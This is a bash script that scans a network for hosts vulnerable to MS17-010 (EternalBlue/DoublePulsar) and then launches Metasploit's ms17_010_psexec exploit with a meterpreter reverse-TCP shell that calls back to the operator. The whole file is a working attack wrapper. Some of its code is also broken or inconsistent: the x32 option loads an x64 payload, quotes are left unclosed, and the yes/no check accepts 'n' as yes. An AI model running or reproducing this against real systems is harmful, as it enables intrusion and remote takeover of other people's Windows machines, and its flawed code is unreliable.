echo "[*] IP Range/Target (192.168.0.0/24)"
read -p "IP(range)> " target
echo "Scanning Network for DoublePulsar"
nmap -Pn -oG --script smb-vuln-ms17-010 -p445 $target > vulnerable.txt && cat vulnerable.txt | grep Up | cut -d ' ' -f 2
echo "Saved results to vulnerable.txt"
echo ""
echo "[*] Enter Vulnerable Machine"
read -p "vuln(IP)> " ip_addr

echo "[*] Run Exploit? [y/N]"
read -p "exp($ip_addr)> " exploit
if [[ $exploit =~ [y/Y] || $exploit =~ [n/N] ]]
then
	echo "[*] Set local IP or use 0.0.0.0"
	read -p "IP(local)> " local
	echo "[*] Choose the Arch: "
	echo "	[1] x32"
	echo "	[2] x64"
	read -p "$ip_addr(arch)> " arch
	if [[ "$arch" == 1 ]]
	then
		echo "Starting Metasploit"
		echo "Target > $ip_addr"
		echo "Payload > windows/x32/meterpreter/reverse_tcp"
		echo "Lhost > $local"
		echo "Port > 3000"
		sleep 3
		clear
		msfconsole -x "use exploit/windows/smb/ms17_010_psexec;\
		set RHOSTS $ip_addr;\
		set PAYLOAD windows/x64/meterpreter/reverse_tcp;\
		set LHOST $local;\
		set LPORT 3000;\
		run"
	else
		echo "Starting Metasploit"
                echo "Target > $ip_addr"
		echo "Exploit > windows/smb/ms17_010_psexec
                echo "Payload > windows/x32/meterpreter/reverse_tcp
                echo "Lhost > $local"
                echo "Port > 3000"
                sleep 3
                clear
                msfconsole -x "use exploit/windows/smb/ms17_010_psexec;\
                set RHOSTS $ip_addr;\
                set PAYLOAD windows/x64/meterpreter/reverse_tcp
                set LHOST $local;\
                set LPORT 3000;\
                run"
	fi
else
	echo "Patch those machines!!"
fi
echo "See you Next time ;)"
